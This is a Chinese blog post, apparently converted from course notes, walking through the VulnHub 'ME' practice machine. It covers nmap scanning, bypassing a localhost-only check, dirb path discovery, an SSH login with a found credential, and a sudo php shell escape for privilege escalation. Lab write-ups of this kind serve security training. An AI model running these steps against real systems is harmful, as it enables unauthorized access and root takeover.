---
title: "VulnHub ME 靶机实战：从 80 端口到本地访问"
date: 2026-10-19T08:00:00+08:00
draft: false
categories: ["课程笔记", "靶机实战"]
tags: ["Linux", "靶机", "渗透", "课程笔记"]
summary: "nmap 网段与主机全面扫描、80 端口信息收集、破解\"只允许本地 127.0.0.1 访问\"的限制、浏览器辅助手法与后续提权思路。"
description: "nmap 网段与主机全面扫描、80 端口信息收集、破解\"只允许本地 127.0.0.1 访问\"的限制、浏览器辅助手法与后续提权思路。"
ShowToc: true
---

> 来源：Linux 服务基础课程讲义（`me.pdf`，共 8 页）。由 PDF 转为 Markdown 并抽取原文图片，仅整理排版与章节层级，正文内容未改写。

~ 信息收集！nmap -sP 192.168.130.0/24

![VulnHub ME 靶机实战 示意图 1](/images/linux-notes/vulnhub-me/img-01.webp)

！全面扫描nmap -A 192.168.130.139~ 访问80端口

![VulnHub ME 靶机实战 示意图 2](/images/linux-notes/vulnhub-me/img-02.webp)

！破解本地访问  （127.0.0.1）

下载插件

![VulnHub ME 靶机实战 示意图 3](/images/linux-notes/vulnhub-me/img-03.webp)

![VulnHub ME 靶机实战 示意图 4](/images/linux-notes/vulnhub-me/img-04.webp)

![VulnHub ME 靶机实战 示意图 5](/images/linux-notes/vulnhub-me/img-05.webp)

![VulnHub ME 靶机实战 示意图 6](/images/linux-notes/vulnhub-me/img-06.webp)

！查看页面源代码！扫描敏感路径 （dirb）

![VulnHub ME 靶机实战 示意图 7](/images/linux-notes/vulnhub-me/img-07.webp)

## ~ 获取所有用户信息

![VulnHub ME 靶机实战 示意图 8](/images/linux-notes/vulnhub-me/img-08.webp)

ssh登陆：

alice  4lic3

![VulnHub ME 靶机实战 示意图 9](/images/linux-notes/vulnhub-me/img-09.webp)

~ 登陆后需要考虑的事情！浏览目录家目录ls -a .my_secret flag1.txt！提权@ sudo -l  查看当前用户有哪些命令可以以管理员去执行

![VulnHub ME 靶机实战 示意图 10](/images/linux-notes/vulnhub-me/img-10.webp)

https://gtfobins.github.io/

```
sudo php -r 'system("/bin/sh -i");'
```

![VulnHub ME 靶机实战 示意图 11](/images/linux-notes/vulnhub-me/img-11.webp)

@ suid       查看当前系统有哪些命令可以以以管理员去执行@ 内核提权
